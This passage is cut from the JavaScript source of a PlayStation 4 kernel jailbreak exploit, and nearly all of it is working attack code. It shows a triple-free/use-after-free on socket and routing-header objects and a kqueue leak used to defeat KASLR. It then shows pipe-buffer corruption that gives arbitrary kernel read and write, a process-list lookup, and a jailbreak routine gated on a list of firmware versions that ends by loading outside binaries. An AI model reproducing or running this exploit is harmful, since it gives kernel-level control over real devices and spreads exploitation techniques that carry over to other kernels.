    close(dup(new BigInt(uaf_socket)));
    triplets[1]=find_triplet(triplets[0], -1);
    if (triplets[1]==-1) { write(new BigInt(iov_sock_1), tmp, 1); close(new BigInt(uaf_socket)); continue; }
    write(new BigInt(iov_sock_1), tmp, 1);
    triplets[2]=find_triplet(triplets[0], triplets[1]);
    if (triplets[2]==-1) { close(new BigInt(uaf_socket)); continue; }
    wait_iov_recvmsg(); read(new BigInt(iov_sock_0), tmp, 1);
    success = true;
  }
  return success;
}

// ======================== kqueue leak + slow R/W ========================
function leak_kqueue() {
  free_rthdr(ipv6_socks[triplets[1]]);
  var magic_val = new BigInt(0x0, 0x1430000);
  var magic_off = leak_rthdr.add(0x08);
  for (var cnt=0; cnt<KQUEUE_ITERATIONS; cnt++) {
    var kq = kqueue();
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
    if (read64(magic_off).eq(magic_val) && !read64(leak_rthdr.add(0x98)).eq(0)) break;
    close(kq); sched_yield();
  }
  if (cnt == KQUEUE_ITERATIONS) { log('kqueue leak failed'); return false; }
  kl_lock = read64(leak_rthdr.add(0x60));
  kq_fdp = read64(leak_rthdr.add(0x98));
  log('kl_lock: '+hex(kl_lock)+' kq_fdp: '+hex(kq_fdp));
  close(kq);
  triplets[1] = find_triplet(triplets[0], triplets[2]);
  return true;
}

function build_uio(uio, uio_iov, uio_td, is_read, addr, size) {
  write64(uio.add(0x00), uio_iov);
  write64(uio.add(0x08), UIO_IOV_NUM);
  write64(uio.add(0x10), BigInt_Error);
  write64(uio.add(0x18), size);
  write32(uio.add(0x20), UIO_SYSSPACE);
  write32(uio.add(0x24), is_read ? 1 : 0); // 1=UIO_READ (kernel->user), 0=UIO_WRITE
  write64(uio.add(0x28), uio_td);
  write64(uio.add(0x30), addr);
  write64(uio.add(0x38), size);
}

function kreadslow(addr, size) {
  var leak_bufs = new Array(UIO_THREAD_NUM);
  for(var i=0;i<UIO_THREAD_NUM;i++) leak_bufs[i]=malloc(size);
  write32(sockopt_val_buf, size);
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
  write(new BigInt(uio_sock_1), tmp, size);
  write64(uioIovRead.add(0x08), size);
  free_rthdr(ipv6_socks[triplets[1]]);
  var uio_leak_off = leak_rthdr.add(0x08);
  for(var cnt=0; cnt<10000; cnt++) {
    trigger_uio_writev(); sched_yield();
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
    if(read32(uio_leak_off) == UIO_IOV_NUM) break;
    read(new BigInt(uio_sock_0), tmp, size);
    for(var i=0;i<UIO_THREAD_NUM;i++) read(new BigInt(uio_sock_0), leak_bufs[i], size);
    wait_uio_writev();
    write(new BigInt(uio_sock_1), tmp, size);
  }
  if(cnt==10000) return BigInt_Error;
  var uio_iov = read64(leak_rthdr);
  build_uio(msgIov, uio_iov, 0, true, addr, size);
  free_rthdr(ipv6_socks[triplets[2]]);
  var iov_leak_off = leak_rthdr.add(0x20);
  for(;;) {
    trigger_iov_recvmsg(); sched_yield();
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
    if(read32(iov_leak_off) == UIO_SYSSPACE) break;
    write(new BigInt(iov_sock_1), tmp, 1);
    wait_iov_recvmsg(); read(new BigInt(iov_sock_0), tmp, 1);
  }
  read(new BigInt(uio_sock_0), tmp, size);
  var res_buf = new BigInt(0);
  var tag = new BigInt(0x41414141,0x41414141);
  for(var i=0;i<UIO_THREAD_NUM;i++) {
    read(new BigInt(uio_sock_0), leak_bufs[i], size);
    if(!read64(leak_bufs[i]).eq(tag)) {
      triplets[1]=find_triplet(triplets[0], -1);
      res_buf = leak_bufs[i].add(0);
      break;
    }
  }
  wait_uio_writev(); write(new BigInt(iov_sock_1), tmp, 1);
  if(res_buf.eq(0)) { wait_iov_recvmsg(); read(new BigInt(iov_sock_0), tmp, 1); return BigInt_Error; }
  for(var retry=0; retry<3; retry++) {
    triplets[2] = find_triplet(triplets[0], triplets[1]);
    if(triplets[2]!=-1) break;
    sched_yield();
  }
  wait_iov_recvmsg(); read(new BigInt(iov_sock_0), tmp, 1);
  return res_buf;
}

function kreadslow64(addr) { var b = kreadslow(addr, 8); if(b.eq(BigInt_Error)) throw new Error('kreadslow failed'); return read64(b); }

function kwriteslow(addr, buf, size) {
  write32(sockopt_val_buf, size);
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
  write64(uioIovWrite.add(0x08), size);
  free_rthdr(ipv6_socks[triplets[1]]);
  var uio_leak_off = leak_rthdr.add(0x08);
  for(;;) {
    trigger_uio_readv(); sched_yield();
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
    if(read32(uio_leak_off) == UIO_IOV_NUM) break;
    for(var i=0;i<UIO_THREAD_NUM;i++) write(new BigInt(uio_sock_1), buf, size);
    wait_uio_readv();
  }
  var uio_iov = read64(leak_rthdr);
  build_uio(msgIov, uio_iov, 0, false, addr, size);
  free_rthdr(ipv6_socks[triplets[2]]);
  var iov_leak_off = leak_rthdr.add(0x20);
  for(;;) {
    trigger_iov_recvmsg(); sched_yield();
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
    if(read32(iov_leak_off) == UIO_SYSSPACE) break;
    write(new BigInt(iov_sock_1), tmp, 1);
    wait_iov_recvmsg(); read(new BigInt(iov_sock_0), tmp, 1);
  }
  for(var i=0;i<UIO_THREAD_NUM;i++) write(new BigInt(uio_sock_1), buf, size);
  triplets[1]=find_triplet(triplets[0], -1);
  wait_uio_readv(); write(new BigInt(iov_sock_1), tmp, 1);
  for(var retry=0; retry<3; retry++) {
    triplets[2] = find_triplet(triplets[0], triplets[1]);
    if(triplets[2]!=-1) break;
    sched_yield();
  }
  wait_iov_recvmsg(); read(new BigInt(iov_sock_0), tmp, 1);
  return new BigInt(0);
}

// ======================== Fast kernel R/W via pipe ========================
function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
  write32(victim_pipe_buf.add(0x00), cnt);
  write32(victim_pipe_buf.add(0x04), _in);
  write32(victim_pipe_buf.add(0x08), out);
  write32(victim_pipe_buf.add(0x0C), size);
  write64(victim_pipe_buf.add(0x10), buffer);
  write(new BigInt(masterWpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
  return read(new BigInt(masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
}
function kread(dest, src, n) {
  corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
  read(new BigInt(victimRpipeFd), dest, n);
}
function kwrite(dest, src, n) {
  corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
  return write(new BigInt(victimWpipeFd), src, n);
}
function kread64(addr) { kread(tmp, addr, 8); return read64(tmp); }
function kread32(addr) { kread(tmp, addr, 4); return read32(tmp); }
function kwrite64(addr, val) { write64(tmp, val); kwrite(addr, tmp, 8); }
function kwrite32(addr, val) { write32(tmp, val); kwrite(addr, tmp, 4); }
function fhold(fp) { kwrite32(fp.add(0x28), kread32(fp.add(0x28))+1); }
function fget(fd) { return kread64(fdt_ofiles.add(fd*FILEDESCENT_SIZE)); }
function remove_rthr_from_socket(fd) {
  if(fd>0) {
    var fp = fget(fd);
    if(fp.gt(new BigInt(0xFFFF0000,0x0))) {
      var data = kread64(fp.add(0)); var so_pcb = kread64(data.add(0x18));
      var in6p = kread64(so_pcb.add(0x118));
      kwrite64(in6p.add(0x68), new BigInt(0));
    }
  }
}
function remove_uaf_file() {
  var uafFile = fget(uaf_socket);
  kwrite64(fdt_ofiles.add(uaf_socket*FILEDESCENT_SIZE), new BigInt(0));
  for(var i=0, removed=0; i<0x1000 && removed<3; i++) {
    var s = Number(socket(AF_UNIX, SOCK_STREAM, 0));
    if(fget(s).eq(uafFile)) { kwrite64(fdt_ofiles.add(s*FILEDESCENT_SIZE), new BigInt(0)); removed++; }
    close(new BigInt(s));
  }
}

function setup_arbitrary_rw() {
  var fd_files = kreadslow64(kq_fdp);
  fdt_ofiles = fd_files.add(0);
  var master_file = kreadslow64(fdt_ofiles.add(masterRpipeFd*FILEDESCENT_SIZE));
  var victim_file = kreadslow64(fdt_ofiles.add(victimRpipeFd*FILEDESCENT_SIZE));
  master_r_pipe_data = kreadslow64(master_file.add(0));
  victim_r_pipe_data = kreadslow64(victim_file.add(0));
  write32(master_pipe_buf.add(0x00), 0); write32(master_pipe_buf.add(0x04), 0);
  write32(master_pipe_buf.add(0x08), 0); write32(master_pipe_buf.add(0x0C), PAGE_SIZE);
  write64(master_pipe_buf.add(0x10), victim_r_pipe_data);
  kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
  if(!kread64(master_r_pipe_data.add(0x10)).eq(victim_r_pipe_data)) throw new Error('pipe corruption failed');
  fhold(fget(masterRpipeFd)); fhold(fget(masterWpipeFd));
  fhold(fget(victimRpipeFd)); fhold(fget(victimWpipeFd));
  remove_rthr_from_socket(ipv6_socks[triplets[0]]);
  remove_rthr_from_socket(ipv6_socks[triplets[1]]);
  remove_rthr_from_socket(ipv6_socks[triplets[2]]);
  remove_uaf_file();
  log('Arbitrary kernel R/W ready');
}

function find_allproc() {
  var pid = Number(getpid());
  write32(sockopt_val_buf, pid);
  ioctl(new BigInt(masterRpipeFd), FIOSETOWN, sockopt_val_buf);
  var fp = fget(masterRpipeFd);
  var fdata = kread64(fp.add(0));
  var sigio = kread64(fdata.add(0xd0));
  var p = kread64(sigio);
  kernel.addr.curproc = p;
  while(!p.and(new BigInt(0xFFFFFFFF,0x00000000)).eq(new BigInt(0xFFFFFFFF,0x00000000)))
    p = kread64(p.add(0x08));
  return p;
}

// ======================== Main exploit orchestrator ========================
function exploit_flow() {
  setup();

  // Attempt heap leak for KASLR (optional, can speed up)
  var leaked = netcontrol_heap_leak();
  if (leaked) {
    var kbase = try_find_kernel_base(leaked);
    if (kbase) {
      kernel.addr.base = kbase;
      log('Kernel base from info leak: '+hex(kbase));
    }
  }

  if (!kernel.addr.base) {
    log('Info leak did not yield kernel base, falling back to triple‑free...');
    if (!trigger_ucred_triplefree()) {
      log('Triple‑free failed'); cleanup(true); return;
    }
    if (!leak_kqueue()) {
      log('kqueue leak failed'); cleanup(true); return;
    }
    kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
    log('Kernel base from kqueue: '+hex(kernel.addr.base));
    setup_arbitrary_rw();
  } else {
    // We have kernel base, but still need R/W: go through triple‑free anyway
    if (!trigger_ucred_triplefree()) {
      log('Triple‑free failed'); cleanup(true); return;
    }
    if (!leak_kqueue()) {
      log('kqueue leak failed'); cleanup(true); return;
    }
    setup_arbitrary_rw();
  }

  // Find allproc and finish jailbreak
  for(var i=0; i<10; i++) sched_yield();
  kernel.addr.allproc = find_allproc();
  jailbreak_shared(FW_VERSION);
  log('Jailbreak complete!');
  cleanup(false);
  show_success();
  run_binloader();
}

// ======================== Entry point ========================
FW_VERSION = get_fwversion();
if (!FW_VERSION) throw new Error('Firmware detection failed');
log('PS4 firmware: '+FW_VERSION);
if (['9.00','9.03','9.04','9.50','9.51','9.60','10.00','10.01','10.50','10.70','10.71',
     '11.00','11.02','11.50','11.52','12.00','12.02','12.50','12.52','13.00','13.02'].indexOf(FW_VERSION)==-1) {
  log('Unsupported firmware'); throw new Error('FW not supported');
}
kernel_offset = get_kernel_offset(FW_VERSION);

exploit_flow();